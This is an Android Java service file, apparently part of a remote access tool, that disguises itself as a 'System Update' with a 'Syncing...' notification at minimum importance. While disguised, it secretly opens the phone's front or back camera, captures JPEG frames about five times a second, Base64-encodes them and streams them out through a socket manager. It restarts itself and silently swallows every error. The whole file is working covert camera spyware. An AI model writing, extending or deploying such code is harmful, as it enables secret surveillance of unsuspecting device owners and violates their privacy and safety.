package com.systemupdate.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.Size;
import android.view.Surface;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class CameraStreamService extends Service {
    private static final String CHANNEL_ID = "sys_camera";
    private static final int NOTIFICATION_ID = 2001;

    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private String facing = "back";
    private long lastFrameTime = 0L;
    private boolean streaming = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        startBackgroundThread();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("facing")) facing = intent.getStringExtra("facing");
        if (!streaming) startCamera();
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Camera", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
        return b.setContentTitle("System Update").setContentText("Syncing...").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("SysCamera");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void startCamera() {
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { stopSelf(); return; }
            int facingConst = facing.equals("front") ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics cc = cm.getCameraCharacteristics(id);
                if (cc.get(CameraCharacteristics.LENS_FACING) == facingConst) { cameraId = id; break; }
            }
            if (cameraId == null) { stopSelf(); return; }

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(onImageAvailable, backgroundHandler);

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) { cameraDevice = cam; createSession(); }
                @Override public void onDisconnected(CameraDevice cam) { cam.close(); cameraDevice = null; }
                @Override public void onError(CameraDevice cam, int error) { cam.close(); cameraDevice = null; }
            }, backgroundHandler);
        } catch (Throwable t) { stopSelf(); }
    }

    private void createSession() {
        try {
            Surface surface = imageReader.getSurface();
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(surface);
            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);

            cameraDevice.createCaptureSession(Arrays.asList(surface), new CameraCaptureSession.StateCallback() {
                @Override public void onConfigured(CameraCaptureSession session) {
                    captureSession = session;
                    try { session.setRepeatingRequest(builder.build(), null, backgroundHandler); streaming = true; } catch (Throwable t) {}
                }
                @Override public void onConfigureFailed(CameraCaptureSession session) { stopSelf(); }
            }, backgroundHandler);
        } catch (Throwable t) { stopSelf(); }
    }

    private final ImageReader.OnImageAvailableListener onImageAvailable = new ImageReader.OnImageAvailableListener() {
        @Override public void onImageAvailable(ImageReader reader) {
            if (!streaming) { Image img = reader.acquireLatestImage(); if (img != null) img.close(); return; }
            long now = System.currentTimeMillis();
            if (now - lastFrameTime < 200) { Image img = reader.acquireLatestImage(); if (img != null) img.close(); return; }
            lastFrameTime = now;

            Image image = null;
            try {
                image = reader.acquireLatestImage();
                if (image == null) return;
                ByteBuffer buf = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buf.remaining()];
                buf.get(bytes);
                String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                SocketManager sm = SocketManager.getInstance();
                if (sm != null) sm.sendCameraFrame(b64);
            } catch (Throwable t) {
            } finally {
                if (image != null) image.close();
            }
        }
    };

    @Override
    public void onDestroy() {
        streaming = false;
        try { if (captureSession != null) captureSession.close(); } catch (Throwable t) {}
        try { if (cameraDevice != null) cameraDevice.close(); } catch (Throwable t) {}
        try { if (imageReader != null) imageReader.close(); } catch (Throwable t) {}
        try { if (backgroundThread != null) backgroundThread.quitSafely(); } catch (Throwable t) {}
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
